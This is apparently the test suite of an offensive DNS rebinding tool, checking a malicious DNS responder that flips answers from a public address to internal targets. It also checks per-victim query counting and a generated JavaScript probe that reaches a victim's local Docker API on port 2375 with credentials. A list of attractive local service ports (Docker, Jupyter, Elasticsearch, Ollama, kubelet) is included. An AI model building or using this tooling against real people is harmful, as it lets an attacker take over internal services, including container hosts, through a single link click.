"""DNS rebinding: the wire format, the policy, and a real UDP round trip.

This is the module that turns a link click into reach into the victim's own
network, so it is tested at three levels: the packet functions (no socket), the
per-client policy, and a live UDP exchange against the responder.

Run:  ./.venv/bin/python -m pytest tests/test_rebind.py -v
"""
import contextlib
import os
import socket
import struct
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from conftest import free_port

from core import rebind as R

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration



def make_query(name, qtype=R.QTYPE_A, tid=0x1234, qclass=R.QCLASS_IN):
    """A real DNS query packet, built by hand (not by the code under test)."""
    return (struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
            + R._encode_name(name) + struct.pack("!HH", qtype, qclass))


# ============================================================= wire format ==
class TestWireFormat:
    def test_a_query_round_trips(self):
        q = R.parse_query(make_query("rebind.example.test"))
        assert q["name"] == "rebind.example.test"
        assert q["qtype"] == R.QTYPE_A and q["qclass"] == R.QCLASS_IN
        assert q["id"] == 0x1234

    def test_the_name_is_lower_cased(self):
        assert R.parse_query(make_query("ReBind.Example.TEST"))["name"] == \
            "rebind.example.test"

    @pytest.mark.parametrize("junk", [b"", b"\x00", b"x" * 11, b"y" * 40,
                                      struct.pack("!HHHHHH", 1, 0, 0, 0, 0, 0)])
    def test_malformed_packets_do_not_raise(self, junk):
        assert R.parse_query(junk) is None

    def test_an_answer_carries_the_address_and_the_ttl(self):
        q = R.parse_query(make_query("rb.test"))
        resp = R.build_response(q, "203.0.113.9", ttl=1)
        assert struct.unpack("!H", resp[:2])[0] == 0x1234          # same id
        assert struct.unpack("!H", resp[6:8])[0] == 1              # one answer
        assert socket.inet_ntoa(resp[-4:]) == "203.0.113.9"
        assert struct.unpack("!I", resp[-10:-6])[0] == 1           # ttl

    def test_the_question_is_echoed(self):
        raw = make_query("rb.test")
        q = R.parse_query(raw)
        resp = R.build_response(q, "10.0.0.1")
        assert q["question"] in resp

    def test_an_aaaa_query_gets_no_address(self):
        """Advertising IPv6 would make the browser prefer it and break the flip."""
        q = R.parse_query(make_query("rb.test", qtype=R.QTYPE_AAAA))
        resp = R.build_response(q, "10.0.0.1")
        assert struct.unpack("!H", resp[6:8])[0] == 0

    def test_a_bad_address_is_not_answered_with_garbage(self):
        q = R.parse_query(make_query("rb.test"))
        resp = R.build_response(q, "not-an-ip")
        assert struct.unpack("!H", resp[6:8])[0] == 0

    def test_none_in_none_out(self):
        assert R.build_response(None, "10.0.0.1") is None


# ================================================================== policy ==
class TestRebindPlan:
    def test_the_first_answer_is_public_so_the_page_loads(self):
        p = R.RebindPlan("203.0.113.9", ["127.0.0.1"])
        assert p.pick(1) == "203.0.113.9"
        assert p.pick(2) == "127.0.0.1"
        assert p.pick(3) == "127.0.0.1"

    def test_targets_rotate(self):
        p = R.RebindPlan("1.1.1.1", ["127.0.0.1", "192.168.1.1"])
        assert [p.pick(i) for i in (2, 3, 4)] == ["127.0.0.1", "192.168.1.1", "127.0.0.1"]

    def test_rotation_can_be_switched_off(self):
        p = R.RebindPlan("1.1.1.1", ["127.0.0.1", "192.168.1.1"], rotate=False)
        assert [p.pick(i) for i in (2, 3)] == ["127.0.0.1", "127.0.0.1"]

    def test_a_later_flip_is_possible(self):
        p = R.RebindPlan("1.1.1.1", ["127.0.0.1"], rebind_after=3)
        assert [p.pick(i) for i in range(1, 5)] == ["1.1.1.1", "1.1.1.1", "1.1.1.1", "127.0.0.1"]

    def test_no_targets_is_a_refusal_not_a_silent_default(self):
        with pytest.raises(ValueError):
            R.RebindPlan("1.1.1.1", [])

    def test_the_ttl_is_at_least_one_second(self):
        assert R.RebindPlan("1.1.1.1", ["127.0.0.1"], ttl=0).ttl == 1

    def test_describe_says_what_will_happen(self):
        d = R.RebindPlan("1.1.1.1", ["127.0.0.1"], ttl=1).describe()
        assert "1.1.1.1" in d and "127.0.0.1" in d


class TestNameMatching:
    def _srv(self):
        return R.RebindServer("rebind.example.test",
                              R.RebindPlan("1.1.1.1", ["127.0.0.1"]))

    def test_the_exact_name_matches(self):
        assert self._srv().matches("rebind.example.test")

    def test_a_subdomain_matches(self):
        assert self._srv().matches("a.rebind.example.test")

    def test_a_lookalike_does_not(self):
        s = self._srv()
        assert not s.matches("evil-rebind.example.test")
        assert not s.matches("rebind.example.test.attacker.test")
        assert not s.matches("example.test")

    def test_case_and_trailing_dot_do_not_matter(self):
        assert self._srv().matches("ReBind.Example.Test.")


# =========================================================== live UDP test ==
def stop_and_settle(srv, port, tries=40):
    """Stop the responder and wait for the port to be released.

    Two tests in a row can be handed the same free port by the OS, and a
    lingering UDP socket from the previous test then answers the next one - which
    made the "a foreign name gets no answer" test flaky.
    """
    srv.stop()
    for _ in range(tries):
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            probe.bind(("127.0.0.1", port))
            probe.close()
            return
        except OSError:
            probe.close()
            time.sleep(0.05)


class TestLiveResponder:
    def _ask(self, port, name="rebind.test", timeout=3):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        try:
            s.sendto(make_query(name, tid=0x4242), ("127.0.0.1", port))
            data, _ = s.recvfrom(512)
        finally:
            s.close()
        return data

    def test_the_answer_flips_from_public_to_target(self):
        port = free_port()
        srv = R.RebindServer("rebind.test",
                             R.RebindPlan("127.0.0.1", ["127.0.0.2"], rebind_after=1,
                                          ttl=1, rotate=False), port=port)
        srv.start()
        try:
            time.sleep(0.2)
            first = self._ask(port)
            second = self._ask(port)
            assert socket.inet_ntoa(first[-4:]) == "127.0.0.1"     # the page loads
            assert socket.inet_ntoa(second[-4:]) == "127.0.0.2"    # then it rebinds
            assert struct.unpack("!H", first[:2])[0] == 0x4242     # id echoed
        finally:
            stop_and_settle(srv, port)

    def test_a_foreign_name_gets_no_answer(self):
        port = free_port()
        srv = R.RebindServer("rebind.test",
                             R.RebindPlan("127.0.0.1", ["127.0.0.2"]), port=port)
        srv.start()
        try:
            time.sleep(0.2)
            with pytest.raises(socket.timeout):
                self._ask(port, name="somewhere.else.test", timeout=1.5)
        finally:
            stop_and_settle(srv, port)

    def test_each_client_has_its_own_count(self):
        """Two victims must not share the query counter, or one of them never
        gets the public address and the page never loads."""
        port = free_port()
        plan = R.RebindPlan("127.0.0.1", ["127.0.0.2"], rebind_after=1, rotate=False)
        srv = R.RebindServer("rebind.test", plan, port=port)
        srv.start()
        try:
            time.sleep(0.2)
            assert plan.pick(srv.counts.get("10.0.0.1", 0) + 1) == "127.0.0.1"
            assert plan.pick(srv.counts.get("10.0.0.2", 0) + 1) == "127.0.0.1"
        finally:
            stop_and_settle(srv, port)

    def test_the_log_records_what_was_answered(self):
        port = free_port()
        srv = R.RebindServer("rebind.test",
                             R.RebindPlan("127.0.0.1", ["127.0.0.2"], rotate=False),
                             port=port)
        srv.start()
        try:
            time.sleep(0.2)
            self._ask(port)
            rows = []
            for _ in range(40):                 # the handler runs on its own thread
                rows = srv.summary()
                if rows:
                    break
                time.sleep(0.05)
            assert rows and rows[-1]["answer"] == "127.0.0.1"
            assert rows[-1]["name"] == "rebind.test"
        finally:
            stop_and_settle(srv, port)


class TestProbeScript:
    def test_the_script_targets_the_rebound_host_and_port(self):
        js = R.probe_script("rb.test", 2375, "/containers/json")
        assert "http://rb.test:2375/containers/json" in js
        assert "credentials:'include'" in js
        assert "catch" in js

    def test_the_service_list_covers_the_useful_local_ports(self):
        for port in (2375, 8888, 9200, 11434, 10250):
            assert port in R.LOCAL_SERVICES
        assert "docker" in R.LOCAL_SERVICES[2375]


class TestPerVictimCounting:
    """Counting per SOURCE ADDRESS means one resolver's victims share a counter: the
    first (any) victim gets the public answer and everyone after gets the target, so
    the page never loads for them. With a labelled name each victim counts alone."""

    def test_a_second_label_also_starts_at_the_public_answer(self):
        port = free_port()
        srv = R.RebindServer("rebind.test",
                             R.RebindPlan("127.0.0.1", ["127.0.0.2"], rebind_after=1,
                                          ttl=1, rotate=False), port=port)
        srv.start()
        try:
            time.sleep(0.2)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            try:
                def ask(name):
                    s.sendto(make_query(name, tid=0x5151), ("127.0.0.1", port))
                    data, _ = s.recvfrom(512)
                    return socket.inet_ntoa(data[-4:])

                # victim A: two queries -> public, then target
                assert ask("aaa.rebind.test") == "127.0.0.1"
                assert ask("aaa.rebind.test") == "127.0.0.2"
                # victim B from the SAME resolver must still get the public answer
                # first, or its page never loads
                assert ask("bbb.rebind.test") == "127.0.0.1", \
                    "a second victim inherited the first victim's counter"
            finally:
                s.close()
        finally:
            stop_and_settle(srv, port)

    def test_the_counter_map_is_capped(self):
        port = free_port()
        srv = R.RebindServer("rebind.test",
                             R.RebindPlan("127.0.0.1", ["127.0.0.2"]), port=port)
        srv.max_counters = 8
        srv.start()
        try:
            time.sleep(0.2)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            try:
                for i in range(40):
                    s.sendto(make_query(f"l{i}.rebind.test", tid=0x6262),
                             ("127.0.0.1", port))
                    with contextlib.suppress(Exception):
                        s.recvfrom(512)
            finally:
                s.close()
            assert len(srv.counts) <= srv.max_counters, len(srv.counts)
        finally:
            stop_and_settle(srv, port)
